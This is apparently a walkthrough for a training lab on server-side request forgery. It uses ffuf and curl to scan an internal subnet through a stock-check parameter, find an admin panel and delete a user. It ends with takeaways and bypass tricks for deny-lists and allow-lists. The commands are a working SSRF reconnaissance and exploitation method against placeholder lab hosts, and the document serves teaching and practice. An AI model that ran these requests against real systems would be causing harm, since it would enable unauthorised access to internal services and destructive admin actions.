# Walkthrough: Basic SSRF Against Another Back-End System

> Replace `<LAB-ID>` and `<SESSION>` with your own lab instance values throughout.

## 1. Capture the original request

1. Open the lab, go to any product page.
2. Open DevTools (`F12`) → **Network** tab → filter by **Fetch/XHR**.
3. Click **"Check stock."**
4. Inspect the request to `/product/stock` and note:
   - The exact parameter name (`stockApi`) and its casing
   - The `Content-Type` header
   - The session cookie

## 2. Scan the internal subnet with ffuf

The admin interface's host is unknown — only the subnet (`192.168.0.0/24`) and port (`8080`) are given. Rather than guess, fuzz the last octet.

**Build a wordlist of candidate hosts:**
```bash
seq 1 255 > ips.txt
```

**Run ffuf against the stock-check endpoint, substituting `FUZZ` for the IP's last octet:**
```bash
ffuf -u 'https://<LAB-ID>.web-security-academy.net/product/stock' \
     -X POST \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -b 'session=<SESSION>' \
     -d 'stockApi=http://192.168.0.FUZZ:8080/admin' \
     -w ips.txt
```

> **Scheme matters.** Use `http://`, not `https://` — the internal service is plain HTTP. Using `https://` causes a TLS handshake failure against every single host, producing uniform results across the entire range and hiding the real hit. If every response in a fuzzing run comes back identical, that's a sign the request template itself is flawed, not that nothing was found.

**Read the output:** the vast majority of candidates return one consistent `Size`/`Words` combination (the generic error for "nothing listening" or "wrong service"). One IP returns a visibly different response size — that's the live admin host.

Optionally filter the noise out once you know the common size, to isolate the hit instantly:
```bash
ffuf -u 'https://<LAB-ID>.web-security-academy.net/product/stock' \
     -X POST \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -b 'session=<SESSION>' \
     -d 'stockApi=http://192.168.0.FUZZ:8080/admin' \
     -w ips.txt \
     -fs <COMMON_SIZE>
```

## 3. Confirm the hit and extract the delete-user link

Once you have the live IP (e.g. `192.168.0.172`), request it directly with curl and search the returned HTML for the target user's delete action:

```bash
curl -s https://<LAB-ID>.web-security-academy.net/product/stock \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'session=<SESSION>' \
  --data-raw 'stockApi=http://192.168.0.172:8080/admin' \
  | grep -o 'href="[^"]*carlos[^"]*"'
```

This returns the exact delete path, e.g.:
```
href="/admin/delete?username=carlos"
```

## 4. Trigger the delete via SSRF

```bash
curl -s https://<LAB-ID>.web-security-academy.net/product/stock \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'session=<SESSION>' \
  --data-raw 'stockApi=http://192.168.0.172:8080/admin/delete?username=carlos'
```

The vulnerable server performs this request from inside the internal network, so it's trusted by the admin service the same way a direct internal request would be.

## 5. Verify

Refresh the lab page — the status banner should flip to **"Solved."**

---

## Key takeaways

- **SSRF can be used for internal network reconnaissance, not just single-target access.** When the exact internal host is unknown, the vulnerable parameter itself becomes the scanning tool — each probe reveals, through response differences, whether a given host/port exists.
- **Uniform fuzzing results are a red flag, not a dead end.** If every single candidate in a wordlist produces an identical response, the request template (scheme, header, parameter name) is almost always the problem — not the absence of a target.
- **Response differentiation signals:** size, word count, status code, and timing are all usable discriminators when scanning blind. No single signal is guaranteed to work on every target, so it's worth checking more than one (`-fs`, `-fw`, `-fr` in ffuf) if the first doesn't cleanly isolate a hit.
- **Tool pairing is effective:** fuzzers (ffuf) are built for breadth — firing many near-identical requests and spotting the outlier. Manual HTTP clients (curl) are built for precision — once a target is known, hand-crafting the exact follow-up request is faster and clearer than continuing to fuzz.

## Related labs (same technique, next steps)

| Lab | What's different |
|---|---|
| SSRF with blacklist-based input filter | Must bypass a deny-list on the URL (IP encoding: `127.1`, decimal/hex forms, etc.) |
| SSRF with whitelist-based input filter | Must abuse URL-parsing quirks (`@` trick, open redirects) to pass an allow-list check |
| Blind SSRF with out-of-band detection | No response body is returned — confirmed via a callback to an external listener instead of reading a response directly |
